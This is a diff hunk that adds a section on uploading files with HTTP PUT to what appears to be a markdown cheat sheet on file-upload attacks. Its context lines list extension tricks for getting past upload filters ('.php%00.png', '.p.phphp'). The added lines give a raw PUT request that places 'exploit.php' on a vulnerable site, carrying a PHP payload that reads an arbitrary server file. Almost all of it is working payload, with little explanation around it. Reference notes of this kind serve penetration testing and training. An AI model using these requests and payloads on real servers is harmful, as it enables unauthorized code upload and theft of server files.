@@ -52,3 +52,12 @@ Content-Type: application/x-httpd-php
 .php%00.png
 .p.phphp
 ```
+### Uploading files using PUT
+```txt
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>
+```
